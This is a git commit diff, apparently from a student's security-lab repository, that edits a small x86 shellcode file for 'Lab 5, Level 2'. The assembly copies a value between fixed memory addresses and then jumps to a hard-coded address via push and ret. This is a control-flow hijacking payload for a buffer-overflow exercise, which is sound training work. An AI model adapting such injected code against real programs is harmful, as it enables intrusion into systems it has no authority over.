68644a7c8c411a5abb08c27eedef7b1219303689
dat._.thinh <44528004+datthinh1801@users.noreply.github.com>
2021-06-12 11:03:08 +0700

    Add files via upload

--- Lab 5/Level 2/shellcode.s
+++ Lab 5/Level 2/shellcode.s
@@ -1,7 +1,6 @@
-movl $0x8013F160,%eax
-movl $0x8013F158,%ebx
-movl (%ebx),%ebx
-movl %ebx,(%eax)
+movl $0x8013F158,%eax
+movl (%eax),%eax
+movl $0x8013F160,%ebx
+movl %eax,(%ebx)
 push $0x80139b69 
-push $0x80139b69
 ret
